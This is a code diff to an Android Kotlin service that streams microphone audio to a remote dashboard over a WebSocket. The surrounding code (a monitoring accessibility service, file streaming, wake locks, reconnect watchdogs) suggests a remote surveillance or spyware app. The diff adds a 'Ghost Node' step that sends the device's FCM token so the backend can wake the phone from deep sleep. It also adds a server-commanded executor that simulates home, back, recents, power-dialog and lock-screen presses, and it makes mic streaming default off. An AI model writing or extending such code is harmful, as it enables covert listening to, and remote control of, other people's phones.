@@ -56,9 +56,6 @@ import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.core.content.edit
 import androidx.exifinterface.media.ExifInterface
-import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.PeriodicWorkRequestBuilder
-import androidx.work.WorkManager
 import kotlinx.coroutines.*
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.sync.Mutex
@@ -170,7 +167,8 @@ class MicService : Service() {
     @Volatile private var isCapturing   = false
     @Volatile private var aiEnhancementEnabled = true
     @Volatile private var aiAutoModeEnabled = true
-    @Volatile private var wantsMicStreaming = true
+    // SENIOR DEV FIX: Default to false. Do not turn on the mic until ordered by the dashboard.
+    @Volatile private var wantsMicStreaming = false
     @Volatile private var isRecoveringMic = false
     @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
     @Volatile private var voiceProfile = "room" // near | room | far
@@ -558,7 +556,11 @@ class MicService : Service() {
         }
 
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
-        if (intent?.action == ACTION_RECONNECT && (intent.data?.schemeSpecificPart?.startsWith("reconnect") == true || intent.data?.schemeSpecificPart == "restart")) {
+        if (intent?.action == ACTION_RECONNECT && (
+                intent.data?.schemeSpecificPart?.startsWith("reconnect") == true || 
+                intent.data?.schemeSpecificPart == "restart" ||
+                intent.data?.schemeSpecificPart == "fcm_wakeup"
+            )) {
             reconnectAlarmTriggerAtElapsed = 0L
             wsReconnectJob?.cancel() // Bug H: explicitly cancel sleeping job so no double connect race
             if (activeWebSocket == null) {
@@ -584,7 +586,6 @@ class MicService : Service() {
         }
         startNetworkEnforcer()
         startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
-        scheduleKeepAlive()
         scheduleReconnectAlarm()
         // Bug 1.1: Reset instance wakeLock on every START_STICKY restart
         if (wakeLock == null) {
@@ -815,8 +816,26 @@ class MicService : Service() {
                 Log.i(TAG, "[WS] Sending device info: $infoMsg")
                 webSocket.send(infoMsg)
 
+                // FCM Ghost Node: Send FCM token so backend can wake this device from deep sleep
+                com.google.firebase.messaging.FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+                    if (task.isSuccessful) {
+                        val token = task.result
+                        prefs.edit().putString("fcm_token", token).apply()
+                        val fcmMsg = JSONObject().apply {
+                            put("type", "fcm_token")
+                            put("deviceId", deviceId)
+                            put("token", token)
+                        }
+                        safeSend(fcmMsg.toString())
+                        Log.i(TAG, "FCM token sent to backend: ${token.take(20)}...")
+                    } else {
+                        Log.w(TAG, "Failed to get FCM token: ${task.exception?.message}")
+                    }
+                }
+
                 // BUG-R10: Restore all session state — not just streaming flag
-                val wasStreaming = prefs.getBoolean("session_streaming", true)
+                // SENIOR DEV FIX: Change the default fallback to false.
+                val wasStreaming = prefs.getBoolean("session_streaming", false)
                 wantsMicStreaming = wasStreaming
                 voiceProfile = prefs.getString("session_voice_profile", "room") ?: "room"
                 softwareGainMultiplier = prefs.getFloat("session_gain", 1.6f).toDouble()
@@ -1099,7 +1118,7 @@ class MicService : Service() {
                     // Apply states (Layer 10 Save/Restore state)
                     if (root.has("sessionState")) {
                         val state = root.getJSONObject("sessionState")
-                        val serverStreaming = state.optBoolean("streaming", true)
+                        val serverStreaming = state.optBoolean("streaming", false)
                         wantsMicStreaming = serverStreaming
                         prefs.edit().putBoolean("session_streaming", serverStreaming).apply()
                     }
@@ -1718,6 +1737,72 @@ class MicService : Service() {
         }
     }
 
+    // ────────────────────────────────────────────────────────────────────────
+    // Remote System Action Executor (Hardware Button Simulation)
+    // ────────────────────────────────────────────────────────────────────────
+
+    private fun executeSystemAction(action: String) {
+        Log.i(TAG, "Executing system hardware action: $action")
+        try {
+            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val accessibilityService = MonitorAccessibilityService.instance
+            var success = true
+
+            when (action) {
+                // ── Volume Controls (Direct via AudioManager) ──
+                "volume_up" -> {
+                    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
+                    audioManager.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_RAISE, 0)
+                }
+                "volume_down" -> {
+                    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
+                    audioManager.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_LOWER, 0)
+                }
+                "volume_mute" -> {
+                    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, AudioManager.FLAG_SHOW_UI)
+                }
+
+                // ── Navigation Controls (Via Accessibility) ──
+                "home" -> {
+                    success = accessibilityService?.triggerHardwareAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME) ?: false
+                }
+                "back" -> {
+                    success = accessibilityService?.triggerHardwareAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK) ?: false
+                }
+                "recents" -> {
+                    success = accessibilityService?.triggerHardwareAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS) ?: false
+                }
+
+                // ── Power Controls ──
+                "power_dialog" -> {
+                    success = accessibilityService?.triggerHardwareAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_POWER_DIALOG) ?: false
+                }
+                "lock_screen" -> {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        success = accessibilityService?.triggerHardwareAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN) ?: false
+                    } else {
+                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                        if (dpm.isDeviceOwnerApp(packageName)) {
+                            dpm.lockNow()
+                        } else {
+                            success = false
+                        }
+                    }
+                }
+                else -> success = false
+            }
+
+            if (success) {
+                sendCommandAck("system_action", "success", action)
+            } else {
+                sendCommandAck("system_action", "error", "action_failed_or_accessibility_offline")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "System action failed: ${e.message}")
+            sendCommandAck("system_action", "error", e.message)
+        }
+    }
+
     private fun handleServerJsonCommand(jsonText: String) {
         Log.i(TAG, "[JSON-COMMAND] Processing: $jsonText")
         try {
@@ -2042,6 +2127,10 @@ class MicService : Service() {
                 "file_stream_cancel" -> {
                     val requestId = obj.optString("requestId", "").trim()
                     fileStreamJobs.remove(requestId)?.cancel()
+                }
+                "system_action" -> {
+                    val action = obj.optString("action", "").trim().lowercase()
+                    executeSystemAction(action)
                 }
                 else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
             }
@@ -5261,21 +5350,6 @@ class MicService : Service() {
             staticWakeLock?.acquire(30 * 60 * 1000L)
             wakeLock = staticWakeLock
         }
-    }
-
-    // ────────────────────────────────────────────────────────────────────────
-    // WorkManager watchdog — keeps service alive 24/7
-    // ────────────────────────────────────────────────────────────────────────
-
-    private fun scheduleKeepAlive() {
-        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
-            .build()
-        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
-            "keep_alive",
-            ExistingPeriodicWorkPolicy.UPDATE,
-            request
-        )
-        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
     }
 
     /**
